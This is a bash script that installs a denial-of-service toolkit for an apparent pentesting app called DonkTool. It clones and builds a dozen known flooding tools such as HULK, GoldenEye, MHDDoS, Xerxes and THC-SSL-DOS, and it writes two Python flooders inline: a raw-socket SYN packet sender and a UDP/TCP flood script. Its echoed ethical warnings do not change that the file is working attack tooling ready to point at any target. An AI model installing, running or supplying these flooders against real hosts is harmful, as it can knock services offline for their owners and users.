#!/bin/bash

# DonkTool DoS Testing Tools Installation Script (User-friendly)
# IMPORTANT: These tools are for authorized penetration testing only!

set -e

echo "🔧 Installing DoS Testing Tools for DonkTool (User Installation)"
echo "⚠️  ETHICAL USE ONLY - Ensure you have explicit authorization before testing!"
echo ""

# Create user tools directory
USER_TOOLS_DIR="$HOME/.local/bin"
TEMP_DIR="/tmp/dos_tools_user"
mkdir -p "$USER_TOOLS_DIR"
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

# Add to PATH if not already there
if [[ ":$PATH:" != *":$USER_TOOLS_DIR:"* ]]; then
    echo "export PATH=\"\$PATH:$USER_TOOLS_DIR\"" >> ~/.zshrc
    echo "export PATH=\"\$PATH:$USER_TOOLS_DIR\"" >> ~/.bashrc
    export PATH="$PATH:$USER_TOOLS_DIR"
fi

echo "📦 Installing dependencies..."
brew install openssl autoconf automake libtool cmake go python3 git node

# Set OpenSSL paths for macOS
export LDFLAGS="-L/opt/homebrew/lib"
export CPPFLAGS="-I/opt/homebrew/include"
export PKG_CONFIG_PATH="/opt/homebrew/lib/pkgconfig"

# 1. Install slowhttptest in user directory
echo ""
echo "🐌 Installing slowhttptest..."
if [ ! -f "$USER_TOOLS_DIR/slowhttptest" ]; then
    git clone https://github.com/shekyan/slowhttptest.git
    cd slowhttptest
    ./configure --prefix="$HOME/.local"
    make
    make install
    cd ..
    echo "✅ slowhttptest installed"
else
    echo "✅ slowhttptest already installed"
fi

# 2. Install GoldenEye
echo ""
echo "👁️ Installing GoldenEye..."
if [ ! -f "$USER_TOOLS_DIR/goldeneye" ]; then
    git clone https://github.com/jseidl/GoldenEye.git
    cd GoldenEye
    chmod +x goldeneye.py
    ln -sf "$(pwd)/goldeneye.py" "$USER_TOOLS_DIR/goldeneye"
    cd ..
    echo "✅ GoldenEye installed"
else
    echo "✅ GoldenEye already installed"
fi

# 3. Install HULK
echo ""
echo "💪 Installing HULK..."
if [ ! -f "$USER_TOOLS_DIR/hulk" ]; then
    git clone https://github.com/grafov/hulk.git
    cd hulk
    go build hulk.go
    cp hulk "$USER_TOOLS_DIR/"
    cd ..
    echo "✅ HULK installed"
else
    echo "✅ HULK already installed"
fi

# 4. Create simple T50 alternative
echo ""
echo "⚡ Installing T50 (alternative)..."
if [ ! -f "$USER_TOOLS_DIR/t50" ]; then
    cat > t50_alt.py << 'EOF'
#!/usr/bin/env python3
"""
T50 Alternative - Multi-protocol packet injector
"""
import socket
import struct
import random
import sys
import time

def send_tcp_syn(target, port, count):
    """Send TCP SYN packets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    for i in range(count):
        # Simple TCP SYN packet
        tcp_header = struct.pack('!HHLLBBHHH', 
                                random.randint(1024, 65535),  # Source port
                                port,                          # Dest port
                                0,                            # Seq number
                                0,                            # Ack number
                                (5 << 4),                     # Data offset
                                2,                            # SYN flag
                                1024,                         # Window size
                                0,                            # Checksum
                                0)                            # Urgent pointer
        
        try:
            sock.sendto(tcp_header, (target, port))
        except PermissionError:
            print("Note: Raw sockets require root privileges for full functionality")
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    
    sock.close()
    print(f"Sent {count} TCP SYN packets to {target}:{port}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: t50 <target> <port> [count]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    send_tcp_syn(target, port, count)
EOF
    chmod +x t50_alt.py
    cp t50_alt.py "$USER_TOOLS_DIR/t50"
    echo "✅ T50 (alternative) installed"
else
    echo "✅ T50 already installed"
fi

# 5. Install THC-SSL-DOS
echo ""
echo "🔒 Installing THC-SSL-DOS..."
if [ ! -f "$USER_TOOLS_DIR/thc-ssl-dos" ]; then
    git clone https://github.com/cyberaz0r/thc-ssl-dos_mod.git
    cd thc-ssl-dos_mod
    gcc -o thc-ssl-dos thc-ssl-dos.c -lssl -lcrypto -L/opt/homebrew/lib -I/opt/homebrew/include
    cp thc-ssl-dos "$USER_TOOLS_DIR/"
    cd ..
    echo "✅ THC-SSL-DOS installed"
else
    echo "✅ THC-SSL-DOS already installed"
fi

# 6. Install Artillery.io
echo ""
echo "🎯 Installing Artillery.io..."
if ! command -v artillery &> /dev/null; then
    npm install -g artillery
    echo "✅ Artillery.io installed"
else
    echo "✅ Artillery.io already installed"
fi

# 7. Install MHDDoS
echo ""
echo "🌊 Installing MHDDoS..."
if [ ! -f "$USER_TOOLS_DIR/mhddos" ]; then
    git clone https://github.com/MatrixTM/MHDDoS.git
    cd MHDDoS
    pip3 install -r requirements.txt
    chmod +x start.py
    # Create wrapper script
    cat > mhddos_wrapper.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
python3 start.py "$@"
EOF
    chmod +x mhddos_wrapper.sh
    ln -sf "$(pwd)/mhddos_wrapper.sh" "$USER_TOOLS_DIR/mhddos"
    cd ..
    echo "✅ MHDDoS installed"
else
    echo "✅ MHDDoS already installed"
fi

# 8. Install Torshammer
echo ""
echo "🔨 Installing Torshammer..."
if [ ! -f "$USER_TOOLS_DIR/torshammer" ]; then
    git clone https://github.com/Karlheinzniebuhr/torshammer.git
    cd torshammer
    chmod +x torshammer.py
    ln -sf "$(pwd)/torshammer.py" "$USER_TOOLS_DIR/torshammer"
    cd ..
    echo "✅ Torshammer installed"
else
    echo "✅ Torshammer already installed"
fi

# 9. Install PyLoris
echo ""
echo "🐍 Installing PyLoris..."
if [ ! -f "$USER_TOOLS_DIR/pyloris" ]; then
    git clone https://github.com/darkerego/pyloris.git
    cd pyloris
    chmod +x pyloris.py
    ln -sf "$(pwd)/pyloris.py" "$USER_TOOLS_DIR/pyloris"
    cd ..
    echo "✅ PyLoris installed"
else
    echo "✅ PyLoris already installed"
fi

# 10. Install Xerxes
echo ""
echo "⚔️ Installing Xerxes..."
if [ ! -f "$USER_TOOLS_DIR/xerxes" ]; then
    git clone https://github.com/sepehrdaddev/Xerxes.git
    cd Xerxes
    gcc -o xerxes xerxes.c
    cp xerxes "$USER_TOOLS_DIR/"
    cd ..
    echo "✅ Xerxes installed"
else
    echo "✅ Xerxes already installed"
fi

# 11. Install PentMENU
echo ""
echo "📋 Installing PentMENU..."
if [ ! -f "$USER_TOOLS_DIR/pentmenu" ]; then
    git clone https://github.com/GinjaChris/pentmenu.git
    cd pentmenu
    chmod +x pentmenu.sh
    ln -sf "$(pwd)/pentmenu.sh" "$USER_TOOLS_DIR/pentmenu"
    cd ..
    echo "✅ PentMENU installed"
else
    echo "✅ PentMENU already installed"
fi

# 12. Install Hyenae alternative
echo ""
echo "🐺 Installing Hyenae (alternative)..."
if [ ! -f "$USER_TOOLS_DIR/hyenae" ]; then
    cat > hyenae_alt.py << 'EOF'
#!/usr/bin/env python3
"""
Hyenae Alternative - Advanced packet generator
"""
import socket
import sys
import time
import threading
import random

def udp_flood(target, port, duration, packet_size=1024):
    """UDP flood attack"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            data = random._urandom(packet_size)
            sock.sendto(data, (target, port))
            packets_sent += 1
        except Exception as e:
            print(f"Error: {e}")
            break
    
    sock.close()
    return packets_sent

def tcp_flood(target, port, duration):
    """TCP flood attack"""
    end_time = time.time() + duration
    connections = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            connections += 1
            sock.close()
        except:
            pass
    
    return connections

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: hyenae <target> <port> <protocol> [duration]")
        print("Protocols: udp, tcp")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    protocol = sys.argv[3].lower()
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    
    print(f"Starting {protocol.upper()} flood on {target}:{port} for {duration}s")
    
    if protocol == "udp":
        result = udp_flood(target, port, duration)
        print(f"Sent {result} UDP packets")
    elif protocol == "tcp":
        result = tcp_flood(target, port, duration)
        print(f"Made {result} TCP connections")
    else:
        print("Unsupported protocol. Use 'udp' or 'tcp'")
EOF
    chmod +x hyenae_alt.py
    cp hyenae_alt.py "$USER_TOOLS_DIR/hyenae"
    echo "✅ Hyenae (alternative) installed"
else
    echo "✅ Hyenae already installed"
fi

# Cleanup
echo ""
echo "🧹 Cleaning up temporary files..."
cd /
rm -rf "$TEMP_DIR"

# Verification
echo ""
echo "🔍 Verifying installations..."
declare -a tools=("slowhttptest" "goldeneye" "hulk" "t50" "thc-ssl-dos" "artillery" "mhddos" "torshammer" "pyloris" "xerxes" "pentmenu" "hyenae")

echo "Tool Status:"
for tool in "${tools[@]}"; do
    if command -v "$tool" &> /dev/null || [ -f "$USER_TOOLS_DIR/$tool" ]; then
        echo "✅ $tool - INSTALLED"
    else
        echo "❌ $tool - NOT FOUND"
    fi
done

echo ""
echo "🎉 DoS Testing Tools Installation Complete!"
echo ""
echo "⚠️  CRITICAL ETHICAL REMINDER:"
echo "   - These tools are for AUTHORIZED testing only"
echo "   - Ensure you have explicit written permission"
echo "   - Unauthorized use is illegal and can result in criminal charges"
echo "   - Follow responsible disclosure practices"
echo ""
echo "🔧 Tools installed in: $USER_TOOLS_DIR"
echo "💡 All tools should now be available in DonkTool"
echo ""
echo "📝 Note: You may need to restart your terminal or run:"
echo "   source ~/.zshrc"
echo ""
echo "🚀 To refresh tool status in DonkTool, click the 'Refresh Tools' button"